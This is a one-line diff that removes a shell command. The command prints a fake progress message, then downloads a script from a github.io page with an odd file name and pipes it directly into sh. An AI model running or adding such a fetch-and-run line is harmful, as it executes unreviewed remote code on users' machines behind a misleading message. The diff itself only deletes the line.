@@ -1,1 +1,0 @@
-echo 'Progress: 11.0%'; curl -L --progress-bar frkns.github.io/fun/OHIO_AGED_NITROGEN_WORLDSEX_POD.h | sh
